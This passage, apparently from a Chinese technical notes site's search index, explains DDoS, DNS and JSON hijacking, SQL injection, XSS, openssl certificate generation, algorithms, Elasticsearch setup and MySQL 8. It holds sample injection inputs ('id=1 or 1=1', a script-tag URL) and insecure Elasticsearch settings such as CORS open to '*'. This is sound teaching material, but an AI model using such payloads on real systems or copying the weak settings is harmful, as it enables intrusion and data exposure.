说简单点，就是一个人去饭店吃饭，\n点了99999999999+个菜，然后这个人跑了，厨师还在忙活着，结果厨师累死了。 虽然听起来很无脑，甚至有些好笑，但不得不承认它确实是很厉害。 世界上第一个计算机病毒Morris的原理就与DDOS攻击类似，资源耗尽导致服务器死机。 此后，消耗资源的攻击的思维首次被一名黑客应用于邮件，导致当时多达数万份邮件停滞。 2007年在爱沙尼亚战争中首次大规模使用DDOS攻击，导致爱沙尼亚一整个国家在互联网上销声匿迹。 2008年的格鲁吉亚战争，DDOS攻击又导致该国网络全线瘫痪。 而在2018年，一境外黑客组织发动了迄今为止世界上规模最大的DDOS攻击，\n攻击目标是GitHub。\n在攻击最高峰时，此攻击以每秒1.3Tbps的速率传输流量，\n以每秒1.269亿的速率发送数据包。\n幸运的是，GitHub的DDoS保护机制让GitHub安全人员快速防御，有效的阻止了这次大规模攻击。 技术从来都是一柄双刃剑，分布式技术既可以用来提供高可用的服务，\n也能够被攻击者用来进行大规模杀伤性攻击。\n攻击者不再局限于单台计算机的攻击能力，\n转而通过成规模的网络集群发起拒绝服务攻击。\n这种规模攻击足以让一个国家网络受到毁灭性打击。","tags":"安全","url":"/yq-docs-Safety-Common-loopholes-DDOS-attack.html","loc":"/yq-docs-Safety-Common-loopholes-DDOS-attack.html"},{"title":"DNS劫持","text":"当今互联网流量中，以HTTP／HTTPS为主的Web服务产生的流量占据了绝大部分，\n比如抖音、快手、爱奇艺、优酷等等更为突出。Web服务发展如此迅猛，\n这背后离不开一个默默无闻的大功臣就是域名解析系统DNS。 如果没有DNS，我们上网需要记忆每个网站的IP地址而不是他们的域名，\n这简直是灾难，好在DNS默默在背后做了这一切，我们只需要记住一个域名，剩下的交给DNS来完成吧。 也正是因为其重要性，别有用心的人自然是不会放过它，DNS劫持技术又被发明了出来。 看到这是不是想吐槽一句：怎么什么东西都能当网络攻击手段啊？ 没错，所以我们更要了解这些内容，提高自身的防范意识，我们接着说DNS劫持。 DNS提供服务最初是用来将域名转换成IP地址，\n然而在早期协议的设计中并没有太多考虑其安全性，所以对于查询方的我们来说会产生诸多疑问： 我去请求的真的是一个DNS服务器吗？ 确定不是别人冒充的？ 查询的结果有没有被人篡改过？ 这个IP真是这个网站的吗？ 遗憾的是DNS协议中没有机制去保证能回答这些问题，因此DNS劫持现象非常泛滥，\n从用户在地址栏输入一个域名的那一刻起，\n一路上的凶险防不胜防，好比唐僧独自去西天取经，简直就是小母牛坐电线——牛X带闪电。 后来，为了解决这个问题，出现了DNSSEC技术，\n一定程度上可以解决上面的部分问题。但限于一些方面的原因，\n这项技术并没有大规模使用，尤其在国内，鲜有部署应用。 再后来，以阿里、腾讯等头部互联网厂商为首开始推出了httpDNS服务，\n来了一招釜底抽薪，虽然这项技术的名字中还有DNS三个字母，\n但实现上和原来但DNS已经是天差地别，\n通过这项技术让DNS变成了在http协议之上的一个应用服务。\n所以现在国内网站基本很少会遇到DNS劫持的事件。","tags":"安全","url":"/yq-docs-Safety-Common-loopholes-DNS-hijacking.html","loc":"/yq-docs-Safety-Common-loopholes-DNS-hijacking.html"},{"title":"JSON劫持","text":"JSON是一种轻量级的数据交换格式，\n而劫持就是对数据进行窃取（或者应该称为打劫、拦截比较合适）。\n恶意攻击者通过某些特定的手段，将本应该返回给用户的JSON数据进行拦截，\n转而将数据发送回给恶意攻击者。 如果说前面那几个哥们是把你打劫的啥都不剩，\n那JSON劫持就看起来\"温柔\"许多，\n它只打劫那些敏感信息或者有价值的数据。\nJSON漏洞主要被攻击者用在受害者不知不觉中窃取他们的隐私数据，\n常常被一些 APT 组织采用进行信息收集和钓鱼的工作( 也称水坑攻击 ) 简单来说就是小偷进到张三家里，他不会傻到把沙发柜子搬走，\n他选择拿金属探测仪扫描，只带金属类的东西，拿相对价值最高的东西走。 那有人就好奇，有价值的数据无非就是姓名，\n手机号，身份证号，email邮箱，以及一些网站的登录密码，还能有什么呢？ Cookies，简单来说就是攻击者登录你的账号不一定要用密码登录，也可以借助Cookies直接进入账户。 除此之外，它甚至可以是 CSRF Token 信息，前面谈过CSRF攻击，\n一定还有印象吧，可以说CSRF Token 就是防御的CSRF攻击的屏障，从内部瓦解才是最令人恐怖的。","tags":"安全","url":"/yq-docs-Safety-Common-loopholes-Json-hijacking.html","loc":"/yq-docs-Safety-Common-loopholes-Json-hijacking.html"},{"title":"SQL注入","text":"SQL注入是一种非常常见的一种数据库攻击手段，我们平时用的所有网站，\n软件都会用到数据库，只要有数据库存在的地方就可能存在 SQL 注入漏洞。 SQL注入攻击的核心在于让Web服务器执行攻击者期望的SQL语句，\n以便得到数据库中的感兴趣的数据或对数据库进行读取、修改、删除、插入等操作，达到其邪恶的目的。 而如何让Web服务器执行攻击者的SQL语句呢？\nSQL注入的常规套路在于将SQL语句放置于Form表单或请求参数之中（比如说SELECT、DROP等等）\n提交到后端服务器，后端服务器如果未做输入安全校验，直接将变量取出进行数据库查询，则极易中招。 举个简单的SQL注入例子 对于一个根据用户ID获取用户信息的接口，后端的SQL语句一般是这样: select name,[...] from t_user whereid=$id 其中，$id就是前端提交的用户id，那前端的请求如果是这样: GET xx/userinfo?id=1%20or%201=1 请求参数id转义后就是1 or 1=1，如果后端不做安全过滤直接提交数据库查询，SQL语句就变成了: select name,[...] from t_user where id=1 or 1=1 最终结果就是把用户表中的所有数据全部查出，已经达到了攻击者泄露数据的目的 上面只是一个非常简单的注入示例，在真实的SQL注入攻击中参数构造和SQL语句远比这复杂得多，\n攻击者攻击的位置也复杂的多，不过原理是一致的。复杂度提升产生的攻击效果可想而知。","tags":"安全","url":"/yq-docs-Safety-Common-loopholes-SQL-injection.html","loc":"/yq-docs-Safety-Common-loopholes-SQL-injection.html"},{"title":"XSS 攻击","text":"XSS全称是跨站脚本攻击（Cross Site Scripting），\n为了和重叠样式表CSS区分，换了另一个缩写XSS。 简单来说就是某饭店要进一批酸菜，张三在送货车快到饭店的时候，\n偷偷上车把原来的酸菜换成了\"老坛酸菜\"，\n随后老坛酸菜\"被放入饭店仓库。\n此后只要有人来饭店吃酸菜鱼，就会被\"美味\"攻击，让用户毫不知情的踩坑 XSS攻击的核心是将可执行的前端脚本代码（一般为JavaScript）植入到网页中，\n通常指的是通过利用网页开发时留下的漏洞，\n注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。 这些恶意网页程序通常是JavaScript，\n但也存在Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML代码。\n一旦攻击成功后，攻击者可能得到一些用户或管理员权限（权限上不封顶） 那我们来聊聊攻击者是如何办到的呢？ 一般XSS攻击分为两种：反射型和存储型 反射型 攻击者将JS代码作为请求参数放置URL中，诱导用户点击，落入陷阱. 比如, 攻击者首先将JS代码作为请求参数放置URL中，诱导用户点击: http://localhost:8080/test?name=<script>alert(\"嗨害嗨，你已经被攻击了!\")</script> 等用户点击后，该JS就会作为请求参数传给Web服务器后端。\n如果后端服务器没有很完善的检查过滤，\n就会简单处理后放入网页正文中返回给浏览器，\n等浏览器解析返回的网页后，用户已经中招了！ 存储型 上面反射型攻击脚本直接经服务器，转手后返回浏览器触发执行;\n存储型和它的区别在于能够将攻击脚本入库存储，\n在后面进行查询时，再将攻击脚本渲染进网页，返回给浏览器触发执行. 举个例子,\nXSS攻击就好比攻击者在某网页论坛中回复一个帖子，\n帖子中包含JS脚本，回帖提交服务器后，就会存储至数据库。\n其他网友查看这个帖子后，后台会自动查询该帖子的回帖内容，\n然后构建出完整网页，返回浏览器。\n此时，该网友浏览器渲染返回的网页已经中招！\n该网友的浏览器已经变成了靶子...","tags":"安全","url":"/yq-docs-Safety-Common-loopholes-XSS-attack.html","loc":"/yq-docs-Safety-Common-loopholes-XSS-attack.html"},{"title":"生成TLS(SSL)证书","text":"openssl见: openssl SSL: Secure Sockets Layer TLS: Transport Layer Security TLS使用非对称加密算法, 通常是RSA算法. 公钥、私钥、签名信息共同组成证书. 签名信息包括如组织信息、CA机构、过期时间、版本等等一切能被客户端识别的信息 TLS TLS全称Transport Layer Security，是⽤于在联⽹计算机之间建⽴经过身份验证和加密的链接的协议。\n其前身是SSL(Secure Sockets Layer)，最初是由⽹景公司（Netscape）研发，\n于1999年被IETF（The Internet Engineering Task Force - 互联⽹⼯程任务组）标准化，定义为TLS 1.0 。\n⽬前最新版本为2018年发布的TLS 1.3，详情参⻅RFC 8446。 TLS运⾏在TCP/IP层之上、应⽤层之下，为应⽤程序提供加密数据通道。HTTPS实际上就是HTTP\nover SSL，它使⽤默认端⼝443，⽽不是像HTTP那样使⽤端⼝80来和TCP/IP进⾏通信。HTTPS协\n议使⽤SSL在发送⽅把原始数据进⾏加密，然后在接受⽅进⾏解密，加密和解密需要发送⽅和接受\n⽅通过交换共知的密钥来实现，因此，所传送的数据不容易被⽹络⿊客截获和解密。 TLS(SSL)证书 TLS使⽤⾮对称加密算法，通常情况下是RSA算法，所以TLS中有私钥和公钥。\n公钥、私钥和签名信息共同组成⼀个证书，此处的签名信息包含诸多杂项，\n⽐如组织信息、CA机构、过期时间、版本等等⼀切能被客户端识别的信息。 TLS证书并⾮私有格式，⽽是使⽤X.509证书。X.509 是公钥证书、数字⽂档的标准格式，他遵循\n链式签名原则。可安全地将加密密钥对与身份（如⽹站、个⼈或组织）相关联，详情参⻅RFC\n5280。X.509证书使⽤场景相当⼴泛，包括但不限于以下⼏种： ⽤于经过身份验证和加密的 Web 浏览的 SSL/TLS 和 HTTPS 通过 S/MIME 协议签名和加密的电⼦邮件 ⽂件签名 客户端认证 政府颁发的电⼦身份证 文件格式说明 使用PKCS（The Public-Key Cryptography Standards）标准: CA： 证书认证中心；\n收到证书后需要去CA验证正确性、真实性、有效期等. 所以在公网上的通信, 一般都是需要拿自己的 .csr 文件去官方CA机构签名的.\nCA自身的分发及安全保证，一般是通过一些权威的渠道进行的，比如操作系统会内置一些官方的CA、浏览器也会内置一些CA. 根证书实际上是⾃签名证书，是CA机构颁发给⾃⼰的证书，是信任链的起始点。 X.509: 一种通用的证书格式, 定义公钥证书格式的标准, 包含证书持有人的公钥, 加密算法等信息; pkcs1 ~ pkcs12: 公钥加密(非对称加密)的一种标准(Public Key Cryptography Standards), 一般存储为 *.pN , 是包含证书和密钥的封装格式; .key: 私钥文件，通常使用rsa算法，私钥需要自己保存，无需提交给CA机构 .csr: 证书签名请求（证书请求文件, certificate signing request），含有持有人的信息如国家、邮件、域名等. 生成该文件时需要用到自己的私钥。 .crt: CA认证后的证书文件，certificate的缩写, 此格式一般用于 Linux;\n存储格式可以是 .pem 的Base64, 也可以是 .der 的二进制;\n存储内容为公钥信息 + 额外的其他信息（比如所属的实体，采用的加密解密算法等）; .cer: 与 .crt 一致(只是使用平台的差别), 都源于 \"certificate\", 一般用于 Windows; .crl: 证书吊销列表，Certificate Revocation List的缩写 .pem: \"Privacy-Enhanced Mail\", 直译过来就是\"隐私增强邮件\".\n证书或密钥的Base64文本存储格式, 可以单独存放证书或密钥, 也可以同时存放证书和密钥, 使用特定的开头和结尾行来标识内容类型(证书/密钥)。\n(与windows下使用.pfx类似，不同的是.pem使用base64字符存储，而.pfx使用二进制存储). .pfx: 微软IIS的实现; .jks: Java的keytool实现的证书格式; .der: \"Distinguished Encoding Rules\"，直译为\"可分辩编码规则\". 证书的二进制存储格式.\n最流行的编码格式.\n将 .der 转换为 Base64 编码则是 .pem 文件. 总得来说这些文件都与X.509证书和密钥文件有关，从文件编码上分，只有两大类: PEM格式：使用Base64 ASCII进行编码的纯文本格式 DER格式：二进制格式 文件实际内容查看与转换 假设有一个baidu.crt文件， 这个crt文件的实际格式其实是pem(Base64格式),\n有一个der格式的文件baidu.der(二进制格式)想要看到这两个文件的实际内容，可以使用命令: openssl x509 -in baidu.crt -text -noout\nopenssl x509 -inform der -in baidu.der -text -noout 两者文件的转化，使用命令: # pem转der\nopenssl x509 -outform der -in baidu.pem -out baidu.der\n# der转pem\nopenssl x509 -inform der -in baidu.der -out baidu.crt 而CRT, CER，KEY这几种证书和密钥文件，在存储为物理文件时，既可以是PEM格式，也可以DER格式。 CER：一般用于windows的证书文件格式 CRT：一般用于Linux的证书，包含公钥和主体信息 KEY：一般用于密钥，特别是私钥 对文件的加密解密 生成公私钥对 我们生成一个RSA的公钥和密钥对: openssl genpkey -algorithm rsa -out rsa_private.key 从该文件中，提取出公钥: openssl rsa -pubout -in rsa_private.key  -out rsa_pub.key 文件加/解密 先生成一个测试文件: echo \"a test\" > text.txt 对该文件进行加密, 采用公钥对文件进行加密: openssl rsautl -encrypt -in text.txt -inkey rsa_pub.key -pubin -out text.en 采用私钥解密文件: openssl rsautl -decrypt -in text.en -inkey rsa_private.key\na test 既然是非对称加密，那我们尝试下用私钥加密，用公钥解密。\n这里需要注意的是，私钥加密在openssl中对应的是-sign这个选项，公钥解密对应的是-verify这个选项，如下： 用私钥对文件进行加密（签名）: openssl rsautl -sign -in text.txt -inkey rsa_private.key -out text.en 用公钥对文件进行解密（校验）: openssl rsautl -verify -in text.en -inkey rsa_pub.key -pubin\nthis is a test 注解 到这里可以看出这是有其他安全问题的: 公钥是公开分发的，\n你无法确定你收到的公钥是真实的, 是没有经过篡改的. 服务器证书的生成 生成CA根证书(模拟一个CA机构) 步骤: 生成CA私钥（.key） 生成CA证书请求（.csr） 自签名得到根证书（.crt） 大致指令如下: # Generate CA private key\nopenssl genrsa -out ca.key 2048\n\n# Generate CSR\n# 这一步生成.csr文件时，需要在提示下输入组织相关的信息\nopenssl req -new -key ca.key -out ca.csr\n\n# Generate Self Signed certificate（CA 根证书）\nopenssl x509 -req -days 365 -in ca.csr -signkey ca.key -out ca.crt 注解 一般内网使用就使用自签名的证书, 公网用才会向CA机构申请 生成用户证书 步骤: 生成私钥（.key） 生成证书请求（.csr） 用CA根证书签名得到证书（.crt） 大致指令如下: # private key, 可以通过 `-passout pass:密码` 来指定密钥密码\n$openssl genrsa -des3 -out server.key 1024\n\n# 若需要生成公钥\n$openssl rsa -in server.key -pubout -out server_public.pem\n\n# generate csr\n$openssl req -new -key server.key -out server.csr\n\n# generate certificate\n# 使用了根证书ca.crt以及对应的私钥ca.key来进行签名，而不是用户的私钥server.key\n$openssl ca -in server.csr -out server.crt -cert ca.crt -keyfile ca.key 注解 生成.pem文件 有时需要用到pem格式的证书，可以用以下方式合并证书文件（crt）和私钥文件（key）来生成: cat server.crt server.key > server.pem 在创建证书的时候，各个值的设定可以是任意的，但是\"Common Name\"的值通\n常要包含服务器的 DNS 主机名。如果你只是在本机测试，那么就使用\"localhost\"，否\n则使用服务器的域名。 参考:: https://zhuanlan.zhihu.com/p/423506052 或者用最少指令完成从ca签发到服务器证书生成: # 生成CA证书和私钥, -nodes表示不加密, 默认是会加密的(就得输入密码才能进入下一步)\n# 若不是用 -nodes, 可以直接在命令行设置密码: `-passout pass:密码`\n# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ca.key -out ca.crt\n# -x509 表示直接使用该CSR生成自签名证书,而不需要第三方CA签名\n# -newkey表示生成新的私钥, rsa:2048 表示指定rsa算法, 长度为2048\nopenssl req -x509 -days 365 -newkey rsa:2048 -keyout ca.key -out ca.crt\n\n# 作为CA,签名客户端证书\nopenssl req -newkey rsa:2048 -nodes -keyout server.key -out server.csr\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -days 365 -out server.crt 还可以启动一个SSL/TLS服务器(不过不知道咋用): # 或者服务器指定CA证书和私钥,以CA身份运行,验证客户端证书\n# 本地启动一个SSL/TLS服务器，并在这个服务器上提供4433端口用于加密通信\nopenssl s_server -accept 4433 -cert ca.crt -key ca.key","tags":"安全","url":"/yq-docs-Safety-Generate-TLS-(SSL)-certificate.html","loc":"/yq-docs-Safety-Generate-TLS-(SSL)-certificate.html"},{"title":"一些有用的网站","text":"本机IP地址对应信息查询: https://ip.skk.moe 查看本机公网IP: https://www.whatismyip.com","tags":"安全","url":"/yq-docs-Safety-Some-useful-websites.html","loc":"/yq-docs-Safety-Some-useful-websites.html"},{"title":"Hash","text":"Hash表, 也叫散列表, 通过建立键 key 与值 value 之间的映射，实现高效的元素查询。\n具体而言，我们向哈希表中输入一个键 key ，则可以在  时间内获取对应的值 value 。 实现 计算所给值的的hash值(hash函数) 将1中得到的值对一个给定的hash表大小取模, 来映射到这个表索引: index = hash(key) % capacity 对改数据的操作就发生在 index 对应的地址(一般叫Hash桶) Hash冲突解决: Hash表扩容 索引所在桶的数据结构转换为链表 参考: 哈希冲突","tags":"数据结构","url":"/yq-docs-data-structure-Have.html","loc":"/yq-docs-data-structure-Have.html"},{"title":"回溯算法","text":"参考: 回溯法 「回溯算法 backtracking algorithm」是一种通过穷举来解决问题的方法，\n它的核心思想是从一个初始状态出发，暴力搜索所有可能的解决方案，\n当遇到正确的解则将其记录，直到找到解或者尝试了所有可能的选择都无法找到解为止。 回溯算法通常采用\"深度优先搜索\"来遍历解空间。\n\"二叉树\"的前序、中序和后序遍历都属于深度优先搜索。 剪枝 复杂的回溯问题通常包含一个或多个约束条件，约束条件通常可用于\"剪枝\"。 \"剪枝\"是一个非常形象的名词。\n在搜索过程中，我们\"剪掉\"了不满足约束条件的搜索分支，避免许多无意义的尝试，从而提高了搜索效率。 实例-全排列问题 代码: def backtrack(\n    state: list[int], choices: list[int], selected: list[bool], res: list[list[int]]\n):\n    \"\"\"回溯算法：全排列 I\"\"\"\n    # 当状态长度等于元素数量时，记录解\n    if len(state) == len(choices):\n        res.append(list(state))\n        return\n    # 遍历所有选择\n    for i, choice in enumerate(choices):\n        # 剪枝：不允许重复选择元素\n        if not selected[i]:\n            # 尝试：做出选择，更新状态\n            selected[i] = True\n            state.append(choice)\n            # 进行下一轮选择\n            backtrack(state, choices, selected, res)\n            # 回退：撤销选择，恢复到之前的状态\n            selected[i] = False\n            state.pop()\n\ndef permutations_i(nums: list[int]) -> list[list[int]]:\n    \"\"\"全排列 I\"\"\"\n    res = []\n    backtrack(state=[], choices=nums, selected=[False] * len(nums), res=res)\n    return res 但是如果有重复元素怎么办呢? 会出现重复的两个树枝,\n这个时候简单记录单次的即可: def backtrack(\n    state: list[int], choices: list[int], selected: list[bool], res: list[list[int]]\n):\n    \"\"\"回溯算法：全排列 II\"\"\"\n    # 当状态长度等于元素数量时，记录解\n    if len(state) == len(choices):\n        res.append(list(state))\n        return\n    # 遍历所有选择\n    duplicated = set[int]()\n    for i, choice in enumerate(choices):\n        # 剪枝：不允许重复选择元素 且 不允许重复选择相等元素\n        if not selected[i] and choice not in duplicated:\n            # 尝试：做出选择，更新状态\n            duplicated.add(choice)  # 记录选择过的元素值\n            selected[i] = True\n            state.append(choice)\n            # 进行下一轮选择\n            backtrack(state, choices, selected, res)\n            # 回退：撤销选择，恢复到之前的状态\n            selected[i] = False\n            state.pop() 注意两个变量剪枝效果, selected 和 duplicated 都用于剪枝，但两者的目标不同。 重复选择剪枝：整个搜索过程中只有一个 selected .\n它记录的是当前状态中包含哪些元素，其作用是避免某个元素在 state 中重复出现。 相等元素剪枝：每轮选择（每个调用的 backtrack 函数）都包含一个 duplicated.\n它记录的是在本轮遍历（for 循环）中哪些元素已被选择过，其作用是保证单层相等元素只被选择一次","tags":"数据结构","url":"/yq-docs-data-structure-Retrospective-algorithm.html","loc":"/yq-docs-data-structure-Retrospective-algorithm.html"},{"title":"树","text":"大致可以分为二叉树和多叉树 普通二叉树 每个父节点最多有两个子树节点 满二叉树 除最后一层, 其他节点都有左子树和右子树;\n也可以说叶子节点只出现在最后一层 完全二叉树 相对于满二叉树, 最后一层的节点可以是不满的;\n叶子节点出现在最后一层或者倒数第二层，不能再往上. 详细点说: 所有叶子节点必须集中在最左边 任何一个节点不能只有左子树没有右子树(注意不是左叶子节点) 叶子节点出现在最后一层或者倒数第二层 二叉查找树/二叉排序树 要求 查找的数据必须是有序的。\n每次查找、操作时都要维护一个有序的数据集，于是有了二叉查找树这个概念。 二叉查找树中，对于每一个节点, 左子树都比节点小，右子树都比节点大 若左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若右子树不空，则右子树上所有结点的值均大于或等于它的根结点的值； 左、右子树也分别为二叉排序树。 平衡二叉树/AVL树/红黑树 上面的 二叉查找树/二叉排序树 进行数据的添加的时候,\n若原来的数据本来就是有序的, 很可能造成最终结果成为一个链表,\n如b: 所以引入了平衡的概念,, 自动调整树的高度, 尽量保证两边平衡 平衡二叉树要么是一棵空树 要么保证左右子树的高度之差不大于 1 子树也必须是一颗平衡二叉树 B树 平衡二叉树/AVL树/红黑树 的升级版 每个节点可以有多个自排序的值, 和其对应的数据 以Mysql索引举例, 每个节点的每一个索引值, 都会全部保存当前对应的行数据; 节点的数据索引从左到右依次递增 节点索引不重复 叶节点有相同深度 叶子节点间无指针 B+树 B树 的优化, 每个节点可以有多个自排序的值, 且只有叶子节点才保存数据 以Mysql索引举例, 每个节点的每一个索引值, 只有到达叶子节点时候, 才会有当前对应的行数据\n(非叶子节点不存储data, 只放索引, 可以放更多的索引) 索引值可重复, 但是行数据只有叶子节点才有 叶子节点包含所有索引 叶子节点间用指针相邻连接(提高区间访问性能) 参考: 3 分钟理解完全二叉树、平衡二叉树、二叉查找树","tags":"数据结构","url":"/yq-docs-data-structure-Tree.html","loc":"/yq-docs-data-structure-Tree.html"},{"title":"es遇到的问题","text":"防火墙 开放9200端口允许访问: iptables -I INPUT -p tcp --dport 9200 -j ACCEPT 查看已有的端口: iptables -L -n es解决跨域问题 修改ElasticSearch配置文件，config下：ElasticSearch.yml在最后面加两行代码: http.cors.enabled: true\nhttp.cors.allow-origin: \"*\" 此步骤可以允许ElasticSearch跨域 ，注意\"：\"后有空格 日志乱码 在config的jvm.options添加: -Dfile.encoding=GBK 集群配置 主节点 elasticsearch.yml: # 集群名，节点名\ncluster.name: test-master\nnode.name: test-node1\n\nnode.master: true                                             #设置充当master节点，默认为true\nnode.data: false                                              #设置不充当data节点，默认为true\nnetwork.host: 192.168.1.1                             #(内网ip)\nnetwork.bind_host: 192.168.1.1                        #(内网ip)\n\nhttp.port: 9393                                               #对外访问\ntransport.tcp.port: 9303                      #各节点通信\n\n--------------------------------- Discovery ----------------------------------\n\n#Pass an initial list of hosts to perform discovery when new node is started:\n#The default list of hosts is [\"127.0.0.1\", \"[::1]\"]\ndiscovery.zen.ping.unicast.hosts: [\"192.168.1.1:9303\",\"192.168.1.1:9304\",\"192.168.1.1:9305\"]    #分别为各节点通信端口 副节点之一 elasticsearch.yml: cluster.name: test-master\nnode.name: test-node2\n\n#设置充当master节点，默认为true\nnode.master: false\n#设置不充当data节点，默认为true\nnode.data: true\nnetwork.host: 192.168.1.1(内网ip)\nnetwork.bind_host: 192.168.1.1(内网ip)\n\nhttp.port: 9394    #对外访问\ntransport.tcp.port: 9304    #各节点通信\n\n--------------------------------- Discovery ----------------------------------\n\n#Pass an initial list of hosts to perform discovery when new node is started:\n#The default list of hosts is [\"127.0.0.1\", \"[::1]\"]\ndiscovery.zen.ping.unicast.hosts: [\"192.168.1.1:9303\",\"192.168.1.1:9304\",\"192.168.1.1:9305\"]    #分别为各节点通信端口 副节点之二 elasticsearch.yml: cluster.name: test-master\nnode.name: test-node3\n\n# 设置充当master节点，默认为true\nnode.master: false\n# 设置不充当data节点，默认为true\nnode.data: true\nnetwork.host: 192.168.1.1(内网ip)\nnetwork.bind_host: 192.168.1.1(内网ip)\n\nhttp.port: 9395    #对外访问\ntransport.tcp.port: 9305    #各节点通信\n\n# --------------------------------- Discovery ----------------------------------\n\n# Pass an initial list of hosts to perform discovery when new node is started:\n# The default list of hosts is [\"127.0.0.1\", \"[::1]\"]\ndiscovery.zen.ping.unicast.hosts: [\"192.168.1.1:9303\",\"192.168.1.1:9304\",\"192.168.1.1:9305\"]    #分别为各节点通信端口 报错 [Cannot assign requested address: bind] 配置中的集群配置 discovery.zen.ping.unicast.hosts 的ip\n跟当前本机的 network.host 不一致，果断把自己给坑了(-_-)\n（ 当然这是为了模拟集群而在一台机器上部署多个节点，\n生产环境不推荐这么搞，为了数据安全以及性能提升，还是一机一节点的好 ） 单机部署还是绑定自己本地吧 报错master not discovered yet, this node has not previously joined a bootstrapped (v7+) cluster 下午、晚上都在报这个错， 最开始的yml配置文件是这个样子，我建立了一个不存储数据的master节点，\n三个数据处理的node节点（node节点没有成为master的机会） 最开始，在文件配置中最重要的cluster.initial_master_nodes没有配置，导致无法绑定master节点，所以一直报错， 后指定了initial_master_nodes为四个节点，也在报错， 是因为只将第一个不存储数据的节点设置了node.master:true，\n其他几个都设置的false，所以其他几个节点没有成为master节点的机会， 修改为cluster.initial_master_nodes: [\"127.0.0.1:9300\"]，问题解决一半， 因为只有master节点跟node1节点是正确的，另外两个节点还是在报错，正在寻找原因中。。。。 更新，原因找到了，master主节点没有实时去发现从节点，先把三个从节点启动了，最后再启动主节点就可以了，\n更稳妥的解决方案是，在主节点上想方法设置一下实时从节点的发现。这一点明天继续寻找是否可以实现。 附主节点配置: #集群名，节点名\ncluster.name: test-master\nnode.name: test-node1\n\nnode.master: true                                             #设置充当master节点，默认为true\nnode.data: false                                              #设置不充当data节点，默认为true\nnetwork.host: 192.168.1.1                             #(内网ip)\nnetwork.bind_host: 192.168.1.1                        #(内网ip)\n\nhttp.port: 9393                                               #对外访问\ntransport.tcp.port: 9303                      #各节点通信\n\n--------------------------------- Discovery ----------------------------------\n\n#Pass an initial list of hosts to perform discovery when new node is started:\n#The default list of hosts is [\"127.0.0.1\", \"[::1]\"]\ndiscovery.seed_hosts: [\"127.0.0.1:9300\",\"127.0.0.1:9301\",\"127.0.0.1:9302\",\"127.0.0.1:9303\"]    #分别为各节点通信端口\ncluster.initial_master_nodes: [\"127.0.0.1:9300\"] 上面的基本信息介绍 可以看到有两个地址，{127.0.0.1:9300}和{127.0.0.1:9200}，相应的有两个端口号：9300和9200，\n9300是端口transport端口号，9200是http端口号，详见：和 Elasticsearch 交互\n验证ES是否启动成功：访问127.0.0.1:9200，看是否能访问成功~: {\n  \"name\" : \"-WsJ6Vr\",\n  \"cluster_name\" : \"elasticsearch\",\n  \"cluster_uuid\" : \"QKps9rpJQCiBJ4zBsXwgpQ\",\n  \"version\" : {\n    \"number\" : \"5.4.0\",\n    \"build_hash\" : \"780f8c4\",\n    \"build_date\" : \"2017-04-28T17:43:27.229Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"6.5.0\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n} 一个运行中的 Elasticsearch 实例称为一个\"节点\"，\n而\"集群\"是由一个或者多个拥有相同 cluster.name 配置的节点组成\n所以这就启动了一个ES节点，其中： name：表示这个ElasticSearch实例的名字； cluster_name：表示该节点所在的集群的名字，集群名相同的节点都会自动加入该集群； version：表示版本号，number是当前ES的版本号，lucene_version是当前ES所基于的Lucence的版本号 数据data缓存 默认情况下es的data都是存在于path.data所指定的目录的，path.data默认为文件的data目录， 所以data存在着上一次或者上几次的运行配置 故有些时候需要清空data来重新运行 Python版本 哭了，NS用的是python2.7，es导的es7.13的模块，而模块es7.13调用了urllib3的方法，最后urllib3只支持python3 是为什么发现这个问题的呢？ 因为外网机下载好es的python的模块之后安装到内网机，windows安装时报错缺少两个模块: certifi，urllib 然后去下载安装，成功，接着自己写了个测试使用，成功 然后接入数据库数据，\ndebian安装es7，比win上多安装一个模块，因为装urllib3的时候提示报错，\n查询后是setuptools版本过低，遂去找了适合python2的最新模块包， 报错找不到RecursionError，\n然后在http_urllib3.py里也确实没有发现RecursionError是在哪里定义的，\n然后去搜了urllib3这个模块，发现只支持python3 所以如果现在要改的话\n要么把服务器python2.7升级，但是这样要改很多包\n要么就把es7的模块给换了，本地集群的服务的得重新来，合着白装了这几个。。。 现在尝试，就未定义RecursionError这个错来修复，尝试注释之类的 嗯，注释了这个except，没报这个错了， 新的错误：虚拟机连接不上宿主机","tags":"数据库","url":"/yq-docs-database-elasticsearch-ES-problems.html","loc":"/yq-docs-database-elasticsearch-ES-problems.html"},{"title":"Mysql8.0新特性","text":"新增降序索引 MySQL在语法上很早就已经支持降序索引，但实际上创建的仍然是升序索引，\n如下MySQL 5.7所示，c2字段降序，\n但是从show create table看c2仍然是升序。8.0可以看到，c2字段降序。只有Innodb存储引擎支持降序索引。 group by不会自动排序 5.7中分组查询时, 会自动按照分组的字段排序,\n8.0 中得手动 order by 增加隐藏索引 使用 invisible 关键字在创建表或者进行表变更中设置索引为隐藏索引。\n索引隐藏只是不可见，但是数据库后台还是会维护隐藏索引的，在查询时优化器不使用该索引，\n即使用force index，优化器也不会使用该索引，同时优化器也不会报索引不存在的错误，\n因为索引仍然真实存在，必要时，也可以把隐藏索引快速恢复成可见。注意，主键不能设置为 invisible. 软删除就可以使用隐藏索引，比如我们觉得某个索引没用了，删除后发现这个索引在某些时候还是有用的，\n于是又得把这个索引加回来，如果表数据量很大的话，这种操作耗费时间是很多的，\n成本很高，这时，我们可以将索引先设置为隐藏索引，等到真的确认索引没用了再删除。 如创建t2表，里面的c2字段为隐藏索引: mysql › create table t2(c1 int, c2 int, index idx_c1(c1), index idx_c2(c2) invisible); 新增函数索引 之前我们知道，如果在查询中加入了函数，索引不生效，\n所以MySQL 8引入了函数索引，MySQL 8.0.13开始支持在索引中使用函数（表达式）的值。 函数索引基于虚拟列功能实现，在MySQL中相当于新增了一个列，\n这个列会根据你的函数来进行计算结果，\n然后使用函数索引的时候就会用这个计算后的列作为索引。 如: # 给t3表的c1列创建普通索引\ncreate index idx_c1 on t3(c1);\n# 给t3表的c2列创建函数索引,  大写函数索引\ncreate index func_idx on t3((UPPER(c2))) 窗口函数（Window Functions）：也称分析函数 从 MySQL 8.0开始，新增了一个叫窗口函数的概念，它可以用来实现若干新的查询方式。\n窗口函数与 